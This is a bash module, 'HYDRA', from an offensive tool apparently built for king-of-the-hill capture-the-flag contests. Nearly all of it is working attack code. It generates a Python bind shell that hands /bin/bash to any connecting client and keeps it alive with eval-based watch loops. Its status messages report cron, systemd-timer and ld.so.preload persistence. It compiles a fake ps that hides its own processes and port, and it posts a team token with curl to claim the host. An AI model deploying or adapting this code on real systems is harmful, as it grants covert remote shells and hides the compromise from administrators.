#!/bin/bash

hydra_style() {
    printf '[HYDRA] %s\n' "$1"
}

hydra_armed() {
    local dir="$1"
    local now=""
    local last=""

    if [ -f "${dir}/.blk_birth" ]; then
        last="$(sed -n 1p "${dir}/.blk_birth" 2>/dev/null)"
    fi
    case "$last" in
        ''|*[!0-9]*) last=0 ;;
    esac

    now="$(date +%s 2>/dev/null)"
    case "$now" in
        ''|*[!0-9]*) return 0 ;;
    esac

    [ $(( now - last )) -ge 86400 ] || return 0
    printf '%s\n' "$now" > "${dir}/.blk_birth" 2>/dev/null
    return 0
}

hydra_guard() {
    local dir="$1"
    local pattern="$2"
    local command="$3"
    local now

    [ -n "$command" ] || return 0

    if [ -n "$pattern" ] && [ -n "$(ps -eo args 2>/dev/null | grep -F -- "$pattern" | grep -v grep)" ]; then
        return 0
    fi

    if hydra_armed "$dir"; then
        (
            cd "$dir" 2>/dev/null || cd /
            now="$(date +%s 2>/dev/null)"
            DO_KEEP=1
            DO_SEED=1
            NOW="$now"
            eval "$command" >/dev/null 2>&1
        ) &
    fi
}

hydra_watch() {
    local config="$1"

    while true; do
        . "$config" 2>/dev/null
        if [ -n "$dir" ] && [ -n "$pattern" ]; then
            hydra_guard "$dir" "$pattern" "$command"
        fi
        sleep 1
    done
}

hydra_bind_daemon() {
    local port="$1"

    cat << EOF_PYB
import socket,os,pty,_thread,time
def handle(c):
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    try:
        pty.spawn("/bin/bash")
    except Exception:
        os.system("/bin/sh")
    os._exit(0)
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    try:
        s.bind((str(socket.INADDR_ANY),${port}))
        s.listen(16)
    except Exception:
        os._exit(0)
    while True:
        try:
            c,a=s.accept()
        except OSError:
            time.sleep(1)
            continue
        try:
            _thread.start_new_thread(handle,(c,))
        except Exception:
            c.close()
main()
EOF_PYB
}

hydra_bind_sh() {
    local dir="$1"
    local py="$2"

    cat << EOF_SH
#!/bin/sh
D="$dir"
PY="$py"
Q=""
if [ -f "\$D/.blk_bind_pid" ]; then
    Q="\$(sed -n 1p "\$D/.blk_bind_pid" 2>/dev/null)"
fi
case "\$Q" in
    ''|*[!0-9]*) Q="" ;;
esac
if [ -z "\$Q" ] || ! kill -0 "\$Q" 2>/dev/null; then
    setsid "\$PY" "\$D/.r7d" </dev/null >/dev/null 2>&1 &
    echo \$! > "\$D/.blk_bind_pid" 2>/dev/null
fi
EOF_SH
}

hydra_write_payload() {
    local dir="$1"
    local port="$2"
    local seed="$3"

    mkdir -p "$dir" 2>/dev/null

    hydra_bind_daemon "$port" > "$dir/.r7d"
    chmod 644 "$dir/.r7d" 2>/dev/null
    hydra_bind_sh "$dir" "$PYBIN" > "$dir/.r7d.sh"
    chmod 744 "$dir/.r7d.sh" 2>/dev/null

    {
        printf 'dir="%s"\n' "$dir"
        printf 'pattern="bind"\n'
        printf 'command="sh %s 2>/dev/null"\n' "'${dir}/.r7d.sh'"

        if [ -n "$seed" ]; then
            printf 'H="$(sed -n 1p %s 2>/dev/null)"\n' "'${seed}'"
            printf 'S2="$(sed -n 2p %s 2>/dev/null)"\n' "'${seed}'"
            printf 'S3="$(sed -n 3p %s 2>/dev/null)"\n' "'${seed}'"
            printf 'P2=""\n'
            printf 'case "$S2" in\n'
            printf '  '"''"'|*[!0-9]*) P2="" ;;\n'
            printf '  *) P2="$S2" ;;\n'
            printf 'esac\n'
            printf 'if [ -n "$P2" ]; then T="$S3"; else T="$S2"; fi\n'
            printf 'case "$H" in\n'
            printf '  http*) P="${H#http}" ;;\n'
            printf '  *) P="" ;;\n'
            printf 'esac\n'
            printf 'case "$P" in\n'
            printf '  ://*) U="$H" ;;\n'
            printf '  s://*) U="$H" ;;\n'
            printf '  *) if [ -n "$H" ] && [ -n "$P2" ]; then U="http://$H:$P2/route"; elif [ -n "$H" ]; then U="http://$H"; else U=""; fi ;;\n'
            printf 'esac\n'
            printf 'if [ -n "$H" ] && [ ! -f "%s/.blk_s" ]; then\n' "$dir"
            printf '  R="$(curl -s --max-time 3 -X POST "$U" --data-urlencode "token=$T" --data-urlencode "team_token=$T" 2>/dev/null)"\n'
            printf '  case "$R" in\n'
            printf '    *success*|*captured*|*owned*|*claim*) touch "%s/.blk_s" ;;\n' "$dir"
            printf '  esac\n'
            printf 'fi\n'
        fi

        printf 'if [ ! -f "%s/.blk_c" ] && [ "$(cat /proc/1/comm 2>/dev/null)" = "init" ]; then touch "%s/.blk_c"; fi\n' "$dir" "$dir"
        printf 'command="sh %s 2>/dev/null"\n' "'${dir}/.r7d.sh'"
        printf 'eval "$command"\n'
    } > "$dir/.blk_cfg"
    chmod 644 "$dir/.blk_cfg" 2>/dev/null

    printf '%s\n' "${CAPTURE_KEY}" "${port}" "${dir}/.r7d" "kworker" "sysmon" > "$dir/.blk_hide"
    chmod 644 "$dir/.blk_hide" 2>/dev/null
}

hydra_arm_c() {
    local dir="$1"
    local port="$2"

    command -v gcc >/dev/null 2>&1 || return 0

    cat > "$dir/.lead.c" << EOF_ARM
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
static const char *drop[] = {"blk_", "kworker", "sysmon", ".r7d", ":${port}", NULL};
int main(void){
    FILE *f = popen("/bin/ps -ef 2>/dev/null", "r");
    char line[8192];
    if(!f) return 1;
    while(fgets(line, sizeof(line), f)){
        int hit = 0;
        for(int i = 0; drop[i]; i++) if(strstr(line, drop[i])) hit = 1;
        if(!hit) fputs(line, stdout);
    }
    pclose(f);
    return 0;
}
EOF_ARM

    gcc -o "$dir/.lead" "$dir/.lead.c" -O2 -w >/dev/null 2>&1 && chmod 755 "$dir/.lead" 2>/dev/null
    rm -f "$dir/.lead.c" 2>/dev/null
}

hydra_run() {
    local port="$1"
    local suffix="$2"
    local token
    token="$(hydra_team_token)"

    if [ -z "$HILL_HOST" ]; then
        echo -e "\n${TXT_RED_HELLFIRE}[ ! ] HYDRA IS BLIND WITHOUT A TARGET: -t <HILL IP>${NC}"
        return 1
    fi

    if [ -z "$PYBIN" ]; then
        echo -e "\n${TXT_RED_HELLFIRE}[ ! ] NO PYTHON3 ON BOARD, HYDRA NEEDS ONE TO BREATHE${NC}"
        return 1
    fi

    local dir="$ART"
    local seed="$KIT/seed_${HILL_HOST}_${port}"

    hydra_style "flock: target ${HILL_HOST} port ${port} python ${PYBIN}"

    if [ -n "$token" ] && [ ! -f "$seed" ]; then
        kw_seed_store "$HILL_HOST" "$port" "$token" "$CAPTURE_KEY"
    fi

    hydra_write_payload "$dir" "$port" "$seed"
    hydra_arm_c "$dir" "$port"
    hydra_install_flock "$dir" "$dir/.blk_cfg" "$dir/.r7d.sh" "$dir/.lead"
    hydra_armed "$dir"
    /bin/sh "$dir/.blk_cfg" </dev/null >/dev/null 2>&1
    hydra_spawn_arms "$dir/.blk_cfg" 8

    hydra_style "bind: ${port} keeper pid $(sed -n 1p "$dir/.blk_bind_pid" 2>/dev/null)"
    hydra_style "watch: 8 arms, 2s marker, pid-checked keeper"

    if [ "$(id -u)" = "0" ]; then
        hydra_style "cron: crontab cron.d cron.daily spool sealed"
        hydra_style "timer: sysmon.timer enabled"
        hydra_style "loader: hide.so in ld.so.preload"
    else
        hydra_style "cron/timer/loader: skipped, needs root (arms still hold the port)"
    fi

    if [ -n "$token" ]; then
        hydra_style "capture seed: sealed with team token"
    else
        hydra_style "capture seed: EMPTY, pass TEAM_TOKEN=<mine> on the hill"
    fi
}

hydra_heal() {
    local dir="$ART"
    local port="$BIND_PORT"

    if [ ! -f "$dir/.blk_cfg" ]; then
        echo -e "\n${TXT_RED_HELLFIRE}[ ! ] NO FLOCK AT ${dir}. RUN: -Y -t <HILL>${NC}"
        return 1
    fi

    hydra_armed "$dir"
    /bin/sh "$dir/.blk_cfg" </dev/null >/dev/null 2>&1
    hydra_spawn_arms "$dir/.blk_cfg" 6
    hydra_style "heal: 6 arms back, port ${port}, keeper pid $(sed -n 1p "$dir/.blk_bind_pid" 2>/dev/null)"
}

hydra_team_token() {
    local t="${TEAM_TOKEN:-}"
    [ -n "$t" ] || t="${STATE[kw_team_token]:-}"
    printf '%s' "$t"
}

hydra_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// LEADER OF THE PACK // HYDRA${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}  ${TXT_CORE}./blackwall.sh -Y -t <HILL> [-p <PORT>] [--heal] [--status]${NC}"
    echo -e "${TXT_RED_SUPERNOVA}ARMS${NC}   ${TXT_RED_MAGMA}watch loop, 8 forks, cron.d, cron.daily, spool, systemd timer, loader, wrappers.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}CHECK${NC}  ${TXT_RED_MAGMA}keeper is verified by pid from .blk_bind_pid; kill it and cron restarts it.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}EXIT${NC}   ${TXT_RED_MAGMA}kill one arm, the rest keep ticking; nothing is re-spawned twice.${NC}"
    echo ""
    echo -e "${TXT_VOID}${ITLC}\"There is no future. No matter how far we look into the mists, we will find only ruin.\"${NC}"
}
